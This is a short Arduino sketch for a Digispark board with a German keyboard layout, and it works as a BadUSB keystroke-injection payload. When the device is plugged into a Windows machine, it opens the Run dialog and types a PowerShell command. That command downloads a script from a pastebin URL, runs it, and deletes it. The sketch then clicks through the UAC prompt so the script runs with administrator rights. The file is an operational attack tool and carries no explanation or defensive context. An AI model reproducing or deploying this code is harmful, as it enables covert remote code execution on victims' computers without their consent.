#include "KeyboardDe.h"

void setup()
{
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.print("powershell wget 'pastebin.com/raw/3wqcrYjd'-o /d.ps1;/d.ps1;rm /d.ps1");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
}

void loop() {}
